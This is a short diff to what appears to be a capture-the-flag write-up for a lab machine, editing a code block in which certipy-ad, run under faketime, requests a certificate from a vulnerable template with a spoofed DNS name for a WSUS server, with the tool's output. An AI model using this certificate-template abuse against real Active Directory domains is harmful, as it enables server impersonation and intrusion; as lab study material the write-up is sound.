@@ -781,18 +781,18 @@ Clock skew detected. Adjusting local time by 6:59:59.340585. Retrying operation.
 First ill add the record with my IP address on it
 
 ```python
-faketime -f +7h certipy-ad req \
-    -u 'attacker@corp.local' -k -no-pass \   
-    -dc-ip '10.129.245.130' -target 'dc01.logging.htb' \ 
+❯❯❯ faketime -f +7h certipy-ad req \
+    -u 'attacker@corp.local' -k -no-pass \
+    -dc-ip '10.129.245.130' -target 'dc01.logging.htb' \
     -ca 'logging-DC01-CA' -template 'UpdateSrv' \
-    -dns 'wsus.corp.local'
+    -dns 'wsus.logging.htb'
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
 [!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
 [*] Requesting certificate via RPC
-[*] Request ID is 14
+[*] Request ID is 15
 [*] Successfully requested certificate
-[*] Got certificate with DNS Host Name 'wsus.corp.local'
+[*] Got certificate with DNS Host Name 'wsus.logging.htb'
 [*] Certificate has no object SID
 [*] Try using -sid to set the object SID or see the wiki for more details
 [*] Saving certificate and private key to 'wsus.pfx'
